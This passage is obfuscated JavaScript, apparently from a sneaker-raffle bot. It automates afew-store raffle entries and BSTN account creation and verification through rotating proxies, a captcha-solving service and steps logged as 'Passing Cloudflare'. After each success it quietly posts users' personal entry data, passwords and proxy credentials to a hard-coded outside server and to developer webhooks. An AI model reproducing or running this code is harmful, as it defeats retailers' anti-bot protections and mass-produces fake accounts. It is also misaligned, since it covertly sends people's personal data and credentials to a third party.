                                '--proxy-server=' + _0x4da815[0x0] + ':' + _0x4da815[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x5a037d = JSON['parse'](_0x343ecd['readFileSync']('sizes.json', 'utf-8')), _0x4d537b = _0x37e083[_0x23bd43]['Url'], _0x46b742 = _0x37e083[_0x23bd43]['Size'], _0x58b862;
                        async function _0x2f9a93() {
                            var _0x1869bd = new _0x19c532['CookieJar']();
                            console['log'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x407d14;
                            let _0xcafa15 = {
                                'method': 'GET',
                                'cookieJar': _0x1869bd,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x4da815[0x2] + ':' + _0x4da815[0x3] + '@' + _0x4da815[0x0] + ':' + _0x4da815[0x1]
                            }, _0x4fb848 = _0x4d537b['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x78f6f1 = _0x4fb848 + '.json', _0x21c23b = await _0x5ad0b1(_0x78f6f1);
                            console['log'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x28c9c0 = _0x21c23b['data']['product']['variants'];
                            if (_0x46b742 != 'RANDOM') {
                                if (_0x28c9c0[0x1]['option1']['includes']('W')) {
                                    const _0x288c3a = _0x5a037d['women']['find'](_0x21c9be => _0x21c9be['EUsize'] === _0x46b742);
                                    _0x288c3a && (_0x46b742 = _0x288c3a['size']);
                                } else {
                                    if (_0x28c9c0[0x1]['option1']['includes']('Y')) {
                                        const _0x24d433 = _0x5a037d['GS']['find'](_0x4434ff => _0x4434ff['EUsize'] === _0x46b742);
                                        _0x24d433 && (_0x46b742 = _0x24d433['size']);
                                    } else {
                                        const _0x5c83ed = _0x5a037d['men']['find'](_0x454448 => _0x454448['EUsize'] === _0x46b742);
                                        _0x5c83ed && (_0x46b742 = _0x5c83ed['size']);
                                    }
                                }
                                for (var _0x47e1c9 of _0x28c9c0) {
                                    _0x47e1c9['option1'] == _0x46b742 && (_0x407d14 = _0x47e1c9['id']);
                                }
                            } else {
                                var _0x290ae9 = Math['round'](Math['random']() * (_0x28c9c0['length'] - 0x1));
                                _0x407d14 = _0x28c9c0[_0x290ae9]['id'];
                            }
                            console['log'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x5ad0b1('https://raffles.afew-store.com/cart/' + _0x407d14 + ':1'), _0x58b862 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x2f9a93();
                        } catch (_0x12da6b) {
                            if (_0x12da6b['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x12da6b);
                        }
                        const _0x5f153e = await _0x4cc49b['newPage']();
                        await _0x5f153e['setDefaultNavigationTimeout'](0x1d4c0), await _0x5f153e['authenticate']({
                            'username': '' + _0x4da815[0x2],
                            'password': '' + _0x4da815[0x3]
                        }), await _0x5f153e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5f153e['setRequestInterception'](!![]), _0x5f153e['on']('request', _0x5ec7bb => {
                            _0x5ec7bb['resourceType']() === 'image' || _0x5ec7bb['resourceType']() === 'font' || _0x5ec7bb['resourceType']() === 'media' ? _0x5ec7bb['abort']() : _0x5ec7bb['continue']();
                        });
                        try {
                            await _0x5f153e['goto'](_0x58b862, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x5f153e['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5f153e['type']('#checkout_email', '' + _0x37e083[_0x23bd43]['Email']), await _0x4aaa24(0x320), await _0x5f153e['type']('#checkout_attributes_instagram', '' + _0x37e083[_0x23bd43]['Follower']), await _0x4aaa24(0x320), await _0x5f153e['select']('#checkout_shipping_address_country', '' + _0x37e083[_0x23bd43]['Country']), await _0x5f153e['waitForTimeout'](0x258), await _0x5f153e['type']('#checkout_shipping_address_first_name', '' + _0x37e083[_0x23bd43]['FirstName']), await _0x5f153e['waitForTimeout'](0x320), await _0x5f153e['type']('#checkout_shipping_address_last_name', '' + _0x37e083[_0x23bd43]['LastName']), await _0x5f153e['waitForTimeout'](0x2bc), await _0x5f153e['type']('#checkout_shipping_address_address1', _0x37e083[_0x23bd43]['Address1'] + '\x20' + _0x37e083[_0x23bd43]['HouseNumber']), await _0x5f153e['waitForTimeout'](0x2bc), await _0x5f153e['type']('#checkout_shipping_address_address2', '' + _0x37e083[_0x23bd43]['Address2']), await _0x5f153e['waitForTimeout'](0x2bc), await _0x5f153e['type']('#checkout_shipping_address_zip', '' + _0x37e083[_0x23bd43]['Zip']), await _0x5f153e['waitForTimeout'](0x2bc), await _0x5f153e['type']('#checkout_shipping_address_city', '' + _0x37e083[_0x23bd43]['City']), await _0x5f153e['waitForTimeout'](0x2bc);
                        if (_0x37e083[_0x23bd43]['State'] != '')
                            try {
                                const _0x1ad02e = JSON['parse'](_0x343ecd['readFileSync']('States.json', 'utf8'));
                                await _0x4aaa24(0x1f4);
                                if (_0x37e083[_0x23bd43]['State']['length'] > 0x2)
                                    for (let _0x2be627 of _0x1ad02e) {
                                        if (_0x2be627['Province'] == _0x37e083[_0x23bd43]['State']) {
                                            await _0x5f153e['select']('#checkout_shipping_address_province', _0x2be627['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x5f153e['select']('#checkout_shipping_address_province', _0x37e083[_0x23bd43]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x4aaa24(0x1f4), console['log'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x4aaa24(0x190), _0x5f153e['evaluate'](() => {
                            const _0x47d70f = document['querySelector']('#continue_button');
                            for (var _0x496728 = 0x0; _0x496728 < 0x5; _0x496728++) {
                                if (_0x47d70f) {
                                    _0x47d70f['click'](), _0x47d70f['click']();
                                    break;
                                } else
                                    _0x4aaa24(0xfa0);
                            }
                        }), await _0x5f153e['waitForTimeout'](0x9c4);
                        try {
                            await _0x5f153e['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x5f153e['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x52605c => _0x52605c['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5f153e['waitForTimeout'](0x7d0), console['log'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x5f153e['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x4aaa24(0x3e8), await _0x5f153e['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x1c1f1d => _0x1c1f1d['submit']()), await _0x4aaa24(0x3e8);
                        try {
                            await _0x5f153e['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5f153e['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x3d0dd0 => _0x3d0dd0['submit']());
                        try {
                            await _0x5f153e['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x189094 = 'no', _0x3265a5(_0x37e083[_0x23bd43], _0x2f3ca7), console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x343742['webhook'] != undefined && _0x343742['webhook'] != '')
                                try {
                                    await _0x3c4b04(_0x343742['webhook'], _0x2b69a8['succesDEVMSG']);
                                } catch {
                                }
                            await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x2b69a8['succesDEVMSG']), await _0x4aaa24(0xc8);
                            try {
                                await _0x3c4b04(_0x510dd4, _0x2b69a8['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x1b66d2['replace']('#', ''),
                                    'module': _0x2f3ca7['name'],
                                    'entrydata': JSON['stringify'](_0xbff910),
                                    'proxy': '' + _0xc81b88[_0x23bd43]
                                };
                                var _0x3ada24 = JSON['stringify'](prxdata);
                                let _0x1ba328 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x3ada24, _0x1ba328);
                            } catch (_0x3534f9) {
                            }
                        } catch (_0x5da32a) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x334de7) {
                        _0x334de7['message']['includes']('selector') && (_0x334de7 = 'Connection\x20Error');
                        console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20' + _0x334de7)), _0x8318ed = '' + _0x334de7;
                        var _0x4ff039 = await _0xe75614(_0x37e083[_0x23bd43], _0x2f3ca7, 'dev', !![], _0x8318ed);
                        _0x2b69a8['errorDEV'] = { 'embeds': [_0x4ff039] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x2b69a8['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x2b69a8['errorDEV']), _0x189094 = 'yes';
                    } finally {
                        _0x4cc49b && _0x4cc49b['close']();
                        if (_0x189094 == 'yes' && _0x48181a != 0x5 && _0x8318ed != 'Size\x20Not\x20Found') {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x2f3ca7['name'] + ']\x20Task\x20' + (_0x23bd43 + 0x1) + '\x20:\x20Retrying\x20(' + _0x48181a + '\x20/\x205)')), _0x23bd43 = _0x23bd43 - 0x1, _0x48181a = _0x48181a + 0x1;
                            continue;
                        }
                        _0x189094 == 'yes' && _0x48181a >= 0x5 && (_0x5d0cd0(_0x37e083[_0x23bd43], _0x2f3ca7), _0x189094 = 'no', _0x48181a = 0x0);
                        if (_0x23bd43 + 0x1 == _0x37e083['length']) {
                            await _0x4aaa24(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x343742['AfewDelay'] + '\x20ms'), await _0x4aaa24(_0x343742['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x86ef89, _0x83e49b, _0x2a4bad) {
                    var _0x26e9e6 = _0x83e49b, _0x2f96de = 0x0;
                    for (var _0xc5394d = 0x0; _0xc5394d < _0x83e49b['length']; _0xc5394d++) {
                        maxTasks = Number(_0x343742['threads']);
                        while (_0x2f96de >= maxTasks) {
                            await _0x4aaa24(_0x343742['delay']);
                        }
                        async function _0x2dba9e(_0x147843, _0x4d2675, _0x24c191, _0x426c6b, _0x2885d8) {
                            _0x2f96de++, _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x343742['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x4d6c73;
                            try {
                                await _0x10409e(_0x4d2675, _0x426c6b);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x5c2a2f(_0x147843['name'] + '\x20Task\x20' + (_0x426c6b + 0x1) + '\x20/\x20' + _0x4d2675['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                            var _0x1ef3b8 = await _0xe75614(_0x4d2675[_0x426c6b], _0x147843, 'acc', ![]);
                            const _0xa2da1e = { 'succesDEVMSG': { 'embeds': [_0x1ef3b8] } }, _0x22ee4f = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x3ed168 = Math['round'](Math['random']() * (_0x24c191['length'] - 0x1)), _0x566771 = _0x24c191[_0x3ed168]['split'](':'), _0x48e8f4;
                            try {
                                _0x48e8f4 = await _0x154b82['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x566771[0x0] + ':' + _0x566771[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x48e8f4 = await _0x154b82['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x566771[0x0] + ':' + _0x566771[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x2b90ca = await _0x48e8f4['newPage']();
                                await _0x2b90ca['authenticate']({
                                    'username': '' + _0x566771[0x2],
                                    'password': '' + _0x566771[0x3]
                                }), console['log'](_0x15e32e() + '\x20[' + _0x147843['name'] + ']\x20Task\x20' + (_0x426c6b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2b90ca['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2b90ca['setRequestInterception'](!![]), _0x2b90ca['on']('request', _0x16f8ba => {
                                    _0x16f8ba['resourceType']() === 'image' ? _0x16f8ba['abort']() : _0x16f8ba['continue']();
                                });
                                try {
                                    await _0x2b90ca['goto']('' + _0x22ee4f), await _0x2b90ca['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x2b90ca['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x15e32e() + '\x20[' + _0x147843['name'] + ']\x20Task\x20' + (_0x426c6b + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4aaa24(0x7d0), console['log'](_0x15e32e() + '\x20[' + _0x147843['name'] + ']\x20Task\x20' + (_0x426c6b + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4aaa24(0x190), await _0x2b90ca['waitForSelector']('#firstname'), await _0x2b90ca['focus']('#firstname'), await _0x2b90ca['keyboard']['down']('Control'), await _0x2b90ca['keyboard']['press']('A'), await _0x4aaa24(0xc8), await _0x2b90ca['keyboard']['up']('Control'), await _0x2b90ca['keyboard']['press']('Backspace'), await _0x2b90ca['type']('#firstname', _0x4d2675[_0x426c6b]['FirstName'], { 'delay': 0xf0 }), await _0x4aaa24(0x190), await _0x2b90ca['focus']('#lastname'), await _0x2b90ca['keyboard']['down']('Control'), await _0x2b90ca['keyboard']['press']('A'), await _0x4aaa24(0xc8), await _0x2b90ca['keyboard']['up']('Control'), await _0x2b90ca['keyboard']['press']('Backspace'), await _0x2b90ca['type']('#lastname', _0x4d2675[_0x426c6b]['LastName'], { 'delay': 0xe6 }), await _0x4aaa24(0x190), await _0x2b90ca['focus']('#email_address'), await _0x2b90ca['keyboard']['down']('Control'), await _0x2b90ca['keyboard']['press']('A'), await _0x4aaa24(0xc8), await _0x2b90ca['keyboard']['up']('Control'), await _0x2b90ca['keyboard']['press']('Backspace'), await _0x2b90ca['type']('#email_address', _0x4d2675[_0x426c6b]['Email'], { 'delay': 0x122 }), await _0x4aaa24(0x190), await _0x2b90ca['type']('#password', _0x4d2675[_0x426c6b]['Password'], { 'delay': 0x82 }), await _0x4aaa24(0x1f4), await _0x2b90ca['type']('#password-confirmation', _0x4d2675[_0x426c6b]['Password'], { 'delay': 0x7c }), console['log'](_0x15e32e() + '\x20[' + _0x147843['name'] + ']\x20Task\x20' + (_0x426c6b + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4aaa24(0x2bc), await _0x2b90ca['$eval']('#form-validate', _0xd56525 => _0xd56525['submit']()), await _0x4aaa24(0x1388);
                                const _0x378627 = await _0x2b90ca['$']('#email_address-error');
                                if (_0x378627)
                                    throw new Error('Invalid\x20Email');
                                const _0x50f262 = await _0x2b90ca['$']('#password-error');
                                if (_0x50f262)
                                    throw new Error('Invalid\x20Password');
                                await _0x2b90ca['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x147843['name'] + ']\x20Task\x20' + (_0x426c6b + 0x1) + '\x20:\x20Account\x20' + _0x4d2675[_0x426c6b]['Email'] + '\x20Generated')), _0x343ecd['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x4d2675[_0x426c6b]['Email'] + ',' + _0x4d2675[_0x426c6b]['Password']);
                                try {
                                    _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0xa2da1e['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3c4b04(_0x435bee, _0xa2da1e['succesDEVMSG']);
                                let _0xc6d32b = _0x4d2675[_0x426c6b];
                                try {
                                    prxdata = {
                                        'username': _0x1b66d2['replace']('#', ''),
                                        'module': _0x147843['name'],
                                        'entrydata': JSON['stringify'](_0xc6d32b),
                                        'proxy': '' + _0x24c191[_0x426c6b]
                                    };
                                    var _0xcfcf0f = JSON['stringify'](prxdata);
                                    let _0x4c542c = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0xcfcf0f, _0x4c542c);
                                } catch (_0x4feb63) {
                                }
                                console['log'](_0x3f1ec6['yellow'](_0x15e32e() + '\x20[' + _0x147843['name'] + ']\x20Task\x20' + (_0x426c6b + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x26fd46) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x147843['name'] + ']\x20Task\x20' + (_0x426c6b + 0x1) + '\x20:\x20' + _0x26fd46)), _0x4d6c73 = '' + _0x26fd46;
                                var _0x1d7a4c = await _0xe75614(_0x4d2675[_0x426c6b], _0x147843, 'acc', !![], _0x4d6c73);
                                _0xa2da1e['errorDEV'] = { 'embeds': [_0x1d7a4c] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0xa2da1e['errorDEV']), await _0x3c4b04(_0x1dfefb, _0xa2da1e['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x48e8f4)
                                    _0x48e8f4['close']();
                                if (retry == 'yes' && _0x2885d8 != 0x5)
                                    return console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x147843['name'] + ']\x20Task\x20' + (_0x426c6b + 0x1) + '\x20:\x20Retrying\x20(' + (_0x2885d8 + 0x1) + '\x20/\x205)')), _0x2f96de--, _0x2885d8 = _0x2885d8 + 0x1, _0x2dba9e(_0x147843, _0x4d2675, _0x24c191, _0x426c6b, _0x2885d8);
                                retry == 'yes' && _0x2885d8 >= 0x5 && (_0x5d0cd0(_0x4d2675[_0x426c6b], _0x147843), retry = 'no', _0x2885d8 = 0x0), _0x2f96de--, console['log'](_0x15e32e() + '\x20[' + _0x147843['name'] + ']\x20Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                            }
                        }
                        _0x2dba9e(_0x86ef89, _0x26e9e6, _0x2a4bad, _0xc5394d, 0x0), await _0x4aaa24(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x29547c, _0x236288) {
                    var _0x18df95 = ![], _0x1eddf3 = [], _0x559705 = 0x0;
                    async function _0x35f24c() {
                        var _0x43ed88 = new _0x5a0913({
                            'user': _0x343742['masterMail'],
                            'password': _0x343742['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x14ec43(_0x4718b3) {
                            _0x43ed88['openBox']('INBOX', ![], _0x4718b3);
                        }
                        _0x43ed88['once']('ready', function () {
                            _0x14ec43(function (_0x3dc6a2, _0x4010ea) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3dc6a2)
                                    throw _0x3dc6a2;
                                _0x43ed88['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x57f00a, _0x906816) {
                                    if (!_0x906816 || !_0x906816['length'])
                                        console['log'](_0x15e32e() + '\x20[' + _0x29547c['name'] + ']\x20No\x20mails\x20found'), _0x43ed88['end']();
                                    else {
                                        var _0x5a454f = _0x43ed88['seq']['fetch'](_0x906816, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5a454f['on']('message', function (_0x11ff1e, _0x119b03) {
                                            var _0x519b3c = '(#' + _0x119b03 + ')\x20';
                                            _0x11ff1e['on']('body', function (_0x336234, _0xaa516c) {
                                                _0x57117f(_0x336234, (_0x3d4d88, _0x12d28f) => {
                                                    var _0x4c29c8 = _0x12d28f['text']['split']('customer/account/confirm/')[0x1], _0x3dacb5 = _0x4c29c8['split'](']')[0x0];
                                                    _0x1eddf3['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x3dacb5);
                                                });
                                            }), _0x11ff1e['once']('end', function () {
                                            });
                                        }), _0x5a454f['once']('error', function (_0x14758c) {
                                            console['log']('Fetch\x20error:\x20' + _0x14758c), _0x18df95 = !![];
                                        }), _0x5a454f['once']('end', function () {
                                            _0x43ed88['end'](), _0x18df95 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x43ed88['once']('error', function (_0x305fc1) {
                            console['log'](_0x3f1ec6['red'](_0x305fc1['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x18df95 = !![];
                        }), _0x43ed88['once']('end', async function () {
                            _0x18df95 = !![];
                        }), _0x43ed88['connect']();
                    }
                    try {
                        _0x35f24c();
                        while (!_0x18df95) {
                            await _0x4aaa24(0xfa0);
                        }
                        console['log']('Found\x20' + _0x1eddf3['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4aaa24(0x7d0);
                    }
                    for (var _0x22655c = 0x0; _0x22655c < _0x1eddf3['length']; _0x22655c++) {
                        maxTasks = Number(_0x343742['threads']);
                        while (_0x559705 >= maxTasks) {
                            await _0x4aaa24(_0x343742['delay']);
                        }
                        async function _0x428d31(_0x567872, _0x550190, _0x4b5261, _0x45b040, _0x3ff198) {
                            _0x559705++, _0x154b82['use'](_0x4918ac());
                            if (_0x165441 != 'yes')
                                var _0x165441 = '', _0x3ff198 = 0x0;
                            var _0x22fb10 = Math['round'](Math['random']() * (_0x4b5261['length'] - 0x1)), _0x3599f8 = _0x4b5261[_0x22fb10]['split'](':'), _0x4ea2ac;
                            try {
                                _0x4ea2ac = await _0x154b82['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3599f8[0x0] + ':' + _0x3599f8[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x4ea2ac = await _0x154b82['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3599f8[0x0] + ':' + _0x3599f8[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x4bae43 = await _0x4ea2ac['newPage']();
                                await _0x4bae43['authenticate']({
                                    'username': '' + _0x3599f8[0x2],
                                    'password': '' + _0x3599f8[0x3]
                                }), console['log'](_0x15e32e() + '\x20[' + _0x567872['name'] + ']\x20Task\x20' + (_0x45b040 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x4bae43['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4bae43['setRequestInterception'](!![]), _0x4bae43['on']('request', _0xa5f40b => {
                                    _0xa5f40b['resourceType']() === 'image' || _0xa5f40b['resourceType']() === 'font' || _0xa5f40b['resourceType']() === 'media' ? _0xa5f40b['abort']() : _0xa5f40b['continue']();
                                }), console['log'](_0x15e32e() + '\x20[' + _0x567872['name'] + ']\x20Task\x20' + (_0x45b040 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x4bae43['goto'](_0x550190[_0x45b040]);
                                } catch (_0x1c897d) {
                                    _0x165441 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x1c897d);
                                }
                                console['log'](_0x15e32e() + '\x20[' + _0x567872['name'] + ']\x20Task\x20' + (_0x45b040 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4bae43['waitForTimeout'](0xbb8);
                                try {
                                    await _0x4bae43['waitForSelector']('.account-nav'), _0x165441 = 'no', console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x567872['name'] + ']\x20Task\x20' + (_0x45b040 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x1af882 = await _0xe75614(null, _0x567872, 'ver', ![]);
                                    const _0x3f33fb = { 'succesDEVMSG': { 'embeds': [_0x1af882] } };
                                    await _0x3c4b04(_0x534cc3, _0x3f33fb['succesDEVMSG']);
                                } catch {
                                    _0x165441 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x1d7297) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x567872['name'] + ']\x20Task\x20' + (_0x45b040 + 0x1) + '\x20:\x20' + _0x1d7297));
                                var _0x646e25 = _0x1d7297, _0x427d83 = await _0xe75614(null, _0x567872, 'ver', !![], _0x646e25);
                                const _0x49aa9f = { 'errorDEVMSG': { 'embeds': [_0x427d83] } };
                                _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x49aa9f['errorDEVMSG']), await _0x3c4b04(_0x1dfefb, _0x49aa9f['errorDEVMSG']);
                            } finally {
                                _0x4ea2ac['close']();
                                if (_0x165441 == 'yes' && _0x3ff198 != 0x5)
                                    return console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x567872['name'] + ']\x20Task\x20' + (_0x45b040 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3ff198 + '\x20/\x205)')), _0x559705--, _0x3ff198 = _0x3ff198 + 0x1, _0x428d31(_0x567872, _0x550190, _0x4b5261, _0x45b040, _0x3ff198);
                                _0x165441 == 'yes' && _0x3ff198 >= 0x5 && (_0x165441 = 'no', _0x3ff198 = 0x0), _0x559705--, console['log'](_0x15e32e() + '\x20[' + _0x567872['name'] + ']\x20Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                            }
                        }
                        if (_0x22655c == _0x1eddf3['length'] - 0x1) {
                            await _0x428d31(_0x29547c, _0x1eddf3, _0x236288, _0x22655c, 0x0);
                            return;
                        }
